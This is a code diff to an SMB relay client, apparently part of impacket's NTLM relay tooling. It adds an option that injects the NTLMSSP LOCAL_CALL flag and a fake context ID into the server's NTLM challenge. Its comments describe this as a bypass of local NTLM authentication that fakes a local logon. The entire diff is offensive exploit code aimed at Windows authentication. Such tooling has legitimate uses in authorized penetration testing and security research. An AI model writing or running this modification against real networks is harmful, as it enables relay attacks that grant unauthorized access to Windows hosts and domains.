@@ -375,6 +375,24 @@ class SMBRelayClient(ProtocolClient):
             challenge.fromString(self.sendNegotiatev2(negotiateMessage))
 
         self.negotiateMessage = negotiateMessage
+
+        # CRITICAL: Inject LOCAL_CALL flag for local NTLM authentication bypass
+        if self.serverConfig.remove_mic_partial:
+            NTLMSSP_NEGOTIATE_LOCAL_CALL = 0x00004000
+            original_challenge_flags = challenge['flags']
+
+            # Add LOCAL_CALL flag to signal local authentication
+            if not (challenge['flags'] & NTLMSSP_NEGOTIATE_LOCAL_CALL):
+                challenge['flags'] |= NTLMSSP_NEGOTIATE_LOCAL_CALL
+                LOG.debug('[SMB] sendNegotiate: INJECTED LOCAL_CALL flag (0x4000) into challenge!')
+                LOG.debug('[SMB] sendNegotiate: Challenge flags changed from 0x%x to 0x%x' % (original_challenge_flags, challenge['flags']))
+
+            # Set a fake context ID in Reserved field (required for LOCAL_CALL)
+            # In real local auth, this would be a server context ID
+            # We use a dummy value since we're faking the local authentication
+            challenge['reserved'] = b'\x01\x00\x00\x00\x00\x00\x00\x00'  # Fake context ID
+            LOG.debug('[SMB] sendNegotiate: Set fake context ID in Reserved field for LOCAL_CALL')
+
         self.challengeMessage = challenge.getData()
 
         # Store the Challenge in our session data dict. It will be used by the SMB Proxy
